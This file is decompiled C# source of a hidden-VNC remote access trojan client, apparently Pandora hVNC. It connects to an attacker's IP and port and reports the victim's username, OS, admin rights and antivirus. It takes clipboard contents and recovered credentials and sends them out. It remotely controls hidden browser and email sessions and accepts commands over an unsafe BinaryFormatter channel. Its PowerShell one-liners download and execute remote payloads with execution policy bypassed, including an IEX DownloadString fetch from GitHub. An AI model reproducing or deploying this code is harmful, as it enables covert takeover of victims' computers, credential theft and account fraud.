using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Management;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Security.Principal;
using System.Threading;
using System.Web;
using System.Windows.Forms;
using DLL.Browser;
using DLL.Functions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace DLL
{
	// Token: 0x02000002 RID: 2
	public class HVNC
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public static bool IsAdministrator()
		{
			return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002068 File Offset: 0x00000268
		public static void ReturnAV()
		{
			try
			{
				ManagementObjectCollection managementObjectCollection = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct").Get();
				string avstatus = "";
				foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
				{
					avstatus = ((ManagementObject)managementBaseObject)["displayName"].ToString();
				}
				Outils.avstatus = avstatus;
			}
			catch (Exception)
			{
				Outils.avstatus = "Not Detected";
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x000020F8 File Offset: 0x000002F8
		public static void xPandoraRecovery()
		{
			Outils.RecoveryResults = PandoraRecovery.GetRecovery();
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002104 File Offset: 0x00000304
		public static void ClipboardFunc(bool mode, string data)
		{
			if (mode)
			{
				HVNC.ClipResults = Clipboard.GetText();
				Outils.SendInformation(Outils.nstream, "3307|" + HVNC.ClipResults);
				return;
			}
			if (!mode)
			{
				Clipboard.SetText(data);
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002138 File Offset: 0x00000338
		[STAThread]
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		private static void Main(string[] cmdArgs)
		{
			try
			{
				Mutex mutex = new Mutex(false, cmdArgs[3]);
				if (!mutex.WaitOne(0, false))
				{
					mutex.Close();
				}
			}
			catch
			{
				Mutex mutex2 = new Mutex(false, "01234567890");
				if (!mutex2.WaitOne(0, false))
				{
					mutex2.Close();
				}
			}
			try
			{
				Outils.HigherThan81 = Conversions.ToBoolean(Outils.Isgreaterorequalto81());
				Outils.TitleBarHeight = Outils.GetSystemMetrics(4);
				if (Outils.TitleBarHeight < 5)
				{
					Outils.TitleBarHeight = 20;
				}
				Outils.Identifier = Conversions.ToString(cmdArgs[0]);
				Outils.ip = cmdArgs[1];
				Outils.port = Conversions.ToInteger(cmdArgs[2]);
				Outils.username = Environment.UserName + "@" + Environment.MachineName;
				Outils.isadmin = HVNC.IsAdministrator().ToString();
				HVNC.avthread.SetApartmentState(ApartmentState.STA);
				HVNC.avthread.IsBackground = true;
				HVNC.avthread.Start();
				HVNC.tPandoraRecovery.SetApartmentState(ApartmentState.STA);
				HVNC.tPandoraRecovery.IsBackground = true;
				HVNC.tPandoraRecovery.Start();
				Outils.screenx = Screen.PrimaryScreen.Bounds.Width;
				Outils.screeny = Screen.PrimaryScreen.Bounds.Height;
				HVNC.SendData(Outils.ip, Outils.port);
				for (;;)
				{
					Thread.Sleep(10000);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000022C0 File Offset: 0x000004C0
		private static void SendData(string ip, int port)
		{
			for (;;)
			{
				Outils.Client = new TcpClient();
				Thread.Sleep(1000);
				try
				{
					Outils.Client.Connect(ip, port);
				}
				catch
				{
					continue;
				}
				break;
			}
			Outils.nstream = Outils.Client.GetStream();
			Outils.nstream.BeginRead(new byte[1], 0, 0, new AsyncCallback(HVNC.Read), null);
			try
			{
				string text = (string)Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion").GetValue("productName");
				RegionInfo currentRegion = RegionInfo.CurrentRegion;
				if (!File.Exists(Interaction.Environ("APPDATA") + "\\temp0923"))
				{
					File.WriteAllText(Interaction.Environ("APPDATA") + "\\temp0923", DateTime.UtcNow.ToString("MM/dd/yyyy"));
				}
				string text2 = File.ReadAllText(Interaction.Environ("APPDATA") + "\\temp0923");
				Outils.Client.Client.RemoteEndPoint.ToString().Split(new char[]
				{
					':'
				});
				Outils.SendInformation(Outils.nstream, string.Concat(new string[]
				{
					"654321|",
					Outils.Identifier,
					"|",
					Outils.username,
					"|",
					currentRegion.Name.ToString(),
					"|",
					text.Replace("Enterprise", null),
					"|",
					text2,
					"|3.1|",
					Outils.isadmin,
					"|",
					Outils.avstatus
				}));
			}
			catch
			{
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x00002498 File Offset: 0x00000698
		public static void Read(IAsyncResult ar)
		{
			checked
			{
				try
				{
					TcpClient client = Outils.Client;
					lock (client)
					{
						BinaryFormatter binaryFormatter = new BinaryFormatter();
						binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
						binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
						binaryFormatter.FilterLevel = TypeFilterLevel.Full;
						byte[] array = new byte[8];
						int i = 8;
						int num = 0;
						while (i > 0)
						{
							int num2 = Outils.nstream.Read(array, num, i);
							if (num2 == 0)
							{
								throw new SocketException(10054);
							}
							int num3 = num2;
							i -= num3;
							num += num3;
						}
						ulong num4 = BitConverter.ToUInt64(array, 0);
						byte[] array2 = new byte[Convert.ToInt32(decimal.Subtract(new decimal(num4), 1m)) + 1];
						object objectValue;
						using (MemoryStream memoryStream = new MemoryStream())
						{
							int num5 = 0;
							int j = array2.Length;
							while (j > 0)
							{
								int num6 = Outils.nstream.Read(array2, num5, j);
								if (num6 == 0)
								{
									throw new SocketException(10054);
								}
								int num7 = num6;
								j -= num7;
								num5 += num7;
							}
							memoryStream.Write(array2, 0, (int)num4);
							memoryStream.Position = 0L;
							objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream)));
							memoryStream.Close();
							memoryStream.Dispose();
						}
						HVNC.HandleData(RuntimeHelpers.GetObjectValue(objectValue));
						Outils.nstream.BeginRead(new byte[1], 0, 0, new AsyncCallback(HVNC.Read), null);
					}
				}
				catch (Exception)
				{
					Outils.Client.Close();
					Outils.newt.Abort();
					HVNC.SendData(Outils.ip, Outils.port);
				}
			}
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002674 File Offset: 0x00000874
		private static void HandleData(object str)
		{
			try
			{
				object obj = Strings.Split(Conversions.ToString(str), "*", -1, CompareMethod.Text);
				ThreadPool.QueueUserWorkItem(new WaitCallback(HVNC.ReceiveCommand), RuntimeHelpers.GetObjectValue(obj));
			}
			catch
			{
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000026C4 File Offset: 0x000008C4
		public static void ReceiveCommand(object id)
		{
			try
			{
				object left = NewLateBinding.LateIndexGet(id, new object[]
				{
					0
				}, null);
				if (Operators.ConditionalCompareObjectEqual(left, 0, false))
				{
					try
					{
						Outils.SendInformation(Outils.nstream, "0|" + Conversions.ToString(Outils.screenx) + "|" + Conversions.ToString(Outils.screeny));
					}
					catch
					{
					}
					Outils.newt = new Thread(new ThreadStart(Outils.SCT));
					Outils.newt.SetApartmentState(ApartmentState.STA);
					Outils.newt.IsBackground = true;
					Outils.newt.Start();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 1, false))
				{
					Outils.newt.Abort();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 2, false))
				{
					Outils.PostClickLD(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[]
					{
						1
					}, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[]
					{
						2
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 3, false))
				{
					Outils.PostClickRD(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[]
					{
						1
					}, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[]
					{
						2
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 4, false))
				{
					Outils.PostClickLU(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[]
					{
						1
					}, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[]
					{
						2
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 5, false))
				{
					Outils.PostClickRU(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[]
					{
						1
					}, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[]
					{
						2
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 6, false))
				{
					Outils.PostDblClk(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[]
					{
						1
					}, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[]
					{
						2
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 7, false))
				{
					Outils.PostKeyDown(Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[]
					{
						1
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 8, false))
				{
					Outils.PostMove(Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[]
					{
						1
					}, null)), Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[]
					{
						2
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 9, false))
				{
					Outils.SendInformation(Outils.nstream, Operators.ConcatenateObject("9|", HVNC.CopyText()));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 10, false))
				{
					HVNC.PasteText(Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[]
					{
						1
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 11, false))
				{
					Chrome.StartChrome(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[]
					{
						1
					}, null)), "nourl");
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 12, false))
				{
					Firefox.StartFirefox(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[]
					{
						1
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 13, false))
				{
					HVNC.ShowStartMenu();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 14, false))
				{
					HVNC.MinTop();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 15, false))
				{
					HVNC.RestoreMaxTop();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 16, false))
				{
					HVNC.CloseTop();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 17, false))
				{
					Outils.interval = Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[]
					{
						1
					}, null));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 18, false))
				{
					Outils.quality = Conversions.ToInteger(NewLateBinding.LateIndexGet(id, new object[]
					{
						1
					}, null));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 19, false))
				{
					Outils.resize = Conversions.ToDouble(NewLateBinding.LateIndexGet(id, new object[]
					{
						1
					}, null));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 21, false))
				{
					HVNC.StartExplorer();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 24, false))
				{
					Process.GetCurrentProcess().Kill();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 30, false))
				{
					Edge.StartEdge(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[]
					{
						1
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 32, false))
				{
					Brave.StartBrave(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[]
					{
						1
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 56, false))
				{
					HVNC.DownloadExecute(Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[]
					{
						1
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 55, false))
				{
					Outils.tempFile = HVNC.RandomString(9);
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[]
					{
						6
					}, null)) == "0")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("USERPROFILE") + "\\Desktop\\" + Outils.tempFile;
					}
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[]
					{
						6
					}, null)) == "1")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("LOCALAPPDATA") + "\\" + Outils.tempFile;
					}
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[]
					{
						6
					}, null)) == "2")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("ProgramFiles") + "\\" + Outils.tempFile;
					}
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[]
					{
						6
					}, null)) == "3")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("APPDATA") + "\\" + Outils.tempFile;
					}
					if (Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[]
					{
						6
					}, null)) == "4")
					{
						Outils.MFile = "\\" + Outils.tempFile + ".exe";
						Outils.MPath = Interaction.Environ("Temp") + "\\" + Outils.tempFile;
					}
					if (!Directory.Exists(Outils.MPath))
					{
						Directory.CreateDirectory(Outils.MPath);
					}
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 50, false))
				{
					HVNC.KillMiner();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 4875, false))
				{
					Process.Start("cmd.exe").WaitForInputIdle();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 4876, false))
				{
					Process.Start("powershell.exe").WaitForInputIdle();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 555, false))
				{
					HVNC.StartOutlook();
					Outils.SendInformation(Outils.nstream, "2555|Outlook has been started!");
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 556, false))
				{
					HVNC.StartFoxMail();
					Outils.SendInformation(Outils.nstream, "2556|Foxmail has been started!");
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 557, false))
				{
					HVNC.StartThunderbird();
					Outils.SendInformation(Outils.nstream, "2557|Thunderbird has been started!");
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 666, false))
				{
					HVNC.KillPandora();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 1337, false))
				{
					HVNC.GetPong();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 444, false))
				{
					Opera.StartOpera(Conversions.ToBoolean(NewLateBinding.LateIndexGet(id, new object[]
					{
						1
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 3306, false))
				{
					string textreceived = Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[]
					{
						1
					}, null));
					Thread thread = new Thread(delegate()
					{
						HVNC.ClipboardFunc(false, textreceived);
					});
					thread.SetApartmentState(ApartmentState.STA);
					thread.IsBackground = true;
					thread.Start();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 3307, false))
				{
					Thread thread2 = new Thread(delegate()
					{
						HVNC.ClipboardFunc(true, "");
					});
					thread2.SetApartmentState(ApartmentState.STA);
					thread2.IsBackground = true;
					thread2.Start();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 3308, false))
				{
					HVNC.RunPandoraRecovery();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 8585, false))
				{
					Chrome.StartChrome(true, Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[]
					{
						1
					}, null)));
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 8586, false))
				{
					HVNC.KillChrome();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 8587, false))
				{
					HVNC.ResetScale();
				}
				else if (Operators.ConditionalCompareObjectEqual(left, 8589, false))
				{
					HVNC.DownloadExecute(Conversions.ToString(NewLateBinding.LateIndexGet(id, new object[]
					{
						1
					}, null)));
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600000A RID: 10 RVA: 0x0000315C File Offset: 0x0000135C
		public static void RunPandoraRecovery()
		{
			new Thread(new ThreadStart(HVNC.xPandoraRecovery));
			Outils.SendInformation(Outils.nstream, "3308|" + Outils.RecoveryResults);
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00003189 File Offset: 0x00001389
		public static void ResetScale()
		{
			HVNC.StartProcess("powershell.exe -exec bypass -C IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PandorahVNC/PhotoCollection/main/rescale.ps1');");
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00003195 File Offset: 0x00001395
		public static void KillChrome()
		{
			HVNC.StartProcess("taskkill /F /IM chrome.exe");
		}

		// Token: 0x0600000D RID: 13 RVA: 0x000031A4 File Offset: 0x000013A4
		public static void StartOutlook()
		{
			foreach (Process process in Process.GetProcesses())
			{
				if (process.ProcessName == "OUTLOOK")
				{
					process.Kill();
					break;
				}
			}
			Process.Start("outlook").WaitForInputIdle();
		}

		// Token: 0x0600000E RID: 14 RVA: 0x000031F4 File Offset: 0x000013F4
		public static void StartFoxMail()
		{
			foreach (Process process in Process.GetProcesses())
			{
				if (process.ProcessName == "Foxmail")
				{
					process.Kill();
					break;
				}
			}
			foreach (string text in Directory.GetDirectories(Environment.GetEnvironmentVariable("SYSTEMDRIVE") + "\\", "Foxmail*"))
			{
				if (text.Contains("Foxmail"))
				{
					Path.GetFullPath(text);
					Process.Start(text + "\\Foxmail.exe").WaitForInputIdle();
					return;
				}
			}
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00003294 File Offset: 0x00001494
		public static void StartThunderbird()
		{
			foreach (Process process in Process.GetProcesses())
			{
				if (process.ProcessName == "thunderbird")
				{
					process.Kill();
					break;
				}
			}
			Process.Start("thunderbird").WaitForInputIdle();
		}

		// Token: 0x06000010 RID: 16 RVA: 0x000032E3 File Offset: 0x000014E3
		public static void GetPong()
		{
			Outils.SendInformation(Outils.nstream, "719|");
		}

		// Token: 0x06000011 RID: 17 RVA: 0x000032F4 File Offset: 0x000014F4
		public static void StartProcess(string processx)
		{
			new Process
			{
				StartInfo = new ProcessStartInfo
				{
					UseShellExecute = false,
					WindowStyle = ProcessWindowStyle.Hidden,
					CreateNoWindow = true,
					FileName = "cmd.exe",
					Arguments = string.Format("/c " + processx, new object[0])
				},
				StartInfo = 
				{
					RedirectStandardOutput = true
				}
			}.Start();
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00003364 File Offset: 0x00001564
		public static void KillPandora()
		{
			List<int> list = new List<int>();
			foreach (Process process in Process.GetProcessesByName("explorer"))
			{
				list.Add(process.Id);
			}
			HVNC.StartProcess("taskkill /F /IM cvtres.exe");
			HVNC.StartProcess("taskkill /PID " + list.Max().ToString() + " /F ");
		}

		// Token: 0x06000013 RID: 19 RVA: 0x000033CC File Offset: 0x000015CC
		public static void Powershell(string args)
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = "powershell.exe",
				Arguments = args,
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				UseShellExecute = false
			});
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00003400 File Offset: 0x00001600
		public static void DownloadExecute(string url)
		{
			string text = HVNC.RandomString(5);
			HVNC.Powershell(string.Concat(new string[]
			{
				"powershell.exe -command PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('",
				url,
				"','",
				Path.GetTempPath(),
				text,
				".exe');Start-Process ('",
				Path.GetTempPath(),
				text,
				".exe')"
			}));
			Outils.SendInformation(Outils.nstream, "256|");
		}

		// Token: 0x06000015 RID: 21 RVA: 0x00003470 File Offset: 0x00001670
		public static void KillMiner()
		{
			Outils.procM.Kill();
		}

		// Token: 0x06000016 RID: 22 RVA: 0x0000347C File Offset: 0x0000167C
		public static string RandomString(int length)
		{
			return new string((from s in Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", length)
			select s[HVNC.random.Next(s.Length)]).ToArray<char>());
		}

		// Token: 0x06000017 RID: 23 RVA: 0x000034B7 File Offset: 0x000016B7
		public static byte[] UTK(string data)
		{
			return HttpServerUtility.UrlTokenDecode(data);
		}

		// Token: 0x06000018 RID: 24 RVA: 0x000034C0 File Offset: 0x000016C0
		public static void StartMethod1(string Hidden)
		{
			if (File.Exists(Outils.MPath + Outils.MFile))
			{
				Outils.procM.StartInfo.UseShellExecute = false;
				if (Hidden == "Hide")
				{
					Outils.procM.StartInfo.CreateNoWindow = false;
					Outils.procM.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				}
				if (Hidden == "Show")
				{
					Outils.procM.StartInfo.CreateNoWindow = true;
					Outils.procM.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
				}
				Outils.procM.StartInfo.FileName = Outils.MPath + Outils.MFile + ".bat";
				Outils.procM.StartInfo.RedirectStandardError = false;
				Outils.procM.StartInfo.RedirectStandardOutput = false;
				Outils.procM.StartInfo.UseShellExecute = true;
				Outils.procM.Start();
				Outils.procM.WaitForExit();
			}
		}

		// Token: 0x06000019 RID: 25 RVA: 0x000035B8 File Offset: 0x000017B8
		public static void StartMethod2(string Hidden)
		{
			if (File.Exists(Outils.MPath + Outils.MFile))
			{
				Outils.procM.StartInfo.UseShellExecute = false;
				if (Hidden == "Hide")
				{
					Outils.procM.StartInfo.CreateNoWindow = false;
					Outils.procM.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				}
				if (Hidden == "Show")
				{
					Outils.procM.StartInfo.CreateNoWindow = true;
					Outils.procM.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
				}
				Outils.procM.StartInfo.FileName = Outils.MPath + Outils.MFile + ".bat";
				Outils.procM.StartInfo.RedirectStandardError = false;
				Outils.procM.StartInfo.RedirectStandardOutput = false;
				Outils.procM.StartInfo.UseShellExecute = true;
				Outils.procM.Start();
				Outils.procM.WaitForExit();
			}
		}

		// Token: 0x0600001A RID: 26 RVA: 0x000036B0 File Offset: 0x000018B0
		public static void StartExplorer()
		{
			Process.Start("explorer");
		}

		// Token: 0x0600001B RID: 27 RVA: 0x000036BD File Offset: 0x000018BD
		public static void CloseTop()
		{
			Outils.SendMessage((int)Outils.lastactivebar, 16, 0, 0);
		}

		// Token: 0x0600001C RID: 28
		[DllImport("user32.dll")]
		public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

		// Token: 0x0600001D RID: 29 RVA: 0x000036D4 File Offset: 0x000018D4
		public static void RestoreMaxTop()
		{
			IntPtr lastactivebar = Outils.lastactivebar;
			if (Outils.IsZoomed(lastactivebar))
			{
				Outils.ShowWindow(lastactivebar, 9);
			}
			else
			{
				Outils.ShowWindow(lastactivebar, 3);
			}
			Rectangle workingArea = Screen.AllScreens[0].WorkingArea;
			HVNC.SetWindowPos(Outils.FindHandle("Welcome to HVNC !"), 0, workingArea.Left, workingArea.Top, workingArea.Width, workingArea.Height, 68);
		}

		// Token: 0x0600001E RID: 30 RVA: 0x00003743 File Offset: 0x00001943
		public static void MinTop()
		{
			Outils.ShowWindow(Outils.lastactivebar, 6);
		}

		// Token: 0x0600001F RID: 31 RVA: 0x00003754 File Offset: 0x00001954
		public static void ShowStartMenu()
		{
			IntPtr hWnd = (Outils.FindWindowEx2((IntPtr)0, (IntPtr)0, (IntPtr)49175, "Start") == IntPtr.Zero) ? Outils.GetWindow(Outils.FindWindow("Shell_TrayWnd", null), 5U) : Outils.FindWindowEx2((IntPtr)0, (IntPtr)0, (IntPtr)49175, "Start");
			Outils.PostMessage(hWnd, 513U, (IntPtr)0L, (IntPtr)Outils.MakeLParam(2, 2));
			Outils.PostMessage(hWnd, 514U, (IntPtr)0L, (IntPtr)Outils.MakeLParam(2, 2));
		}

		// Token: 0x06000020 RID: 32 RVA: 0x00003804 File Offset: 0x00001A04
		public static object CopyText()
		{
			Outils.SendMessage((int)Outils.lastactive, 258, 3, (int)IntPtr.Zero);
			Outils.SendMessage((int)Outils.lastactive, 769, 0, 0);
			Outils.PostMessage(Outils.lastactive, 258U, (IntPtr)3, IntPtr.Zero);
			Outils.PostMessage(Outils.lastactive, 769U, (IntPtr)0, (IntPtr)0);
			return Clipboard.GetText();
		}

		// Token: 0x06000021 RID: 33 RVA: 0x0000387C File Offset: 0x00001A7C
		public static void PasteText(string ToPaste)
		{
			Clipboard.SetText(ToPaste);
			Outils.SendMessage((int)Outils.lastactive, 770, 0, 0);
		}

		// Token: 0x04000001 RID: 1
		public static string ClipResults;

		// Token: 0x04000002 RID: 2
		public static string SetClip;

		// Token: 0x04000003 RID: 3
		public static Thread avthread = new Thread(new ThreadStart(HVNC.ReturnAV));

		// Token: 0x04000004 RID: 4
		public static Thread tPandoraRecovery = new Thread(new ThreadStart(HVNC.xPandoraRecovery));

		// Token: 0x04000005 RID: 5
		public static Random random = new Random();

		// Token: 0x04000006 RID: 6
		private const short SWP_NOMOVE = 2;

		// Token: 0x04000007 RID: 7
		private const short SWP_NOSIZE = 1;

		// Token: 0x04000008 RID: 8
		private const short SWP_NOZORDER = 4;

		// Token: 0x04000009 RID: 9
		private const int SWP_SHOWWINDOW = 64;
	}
}
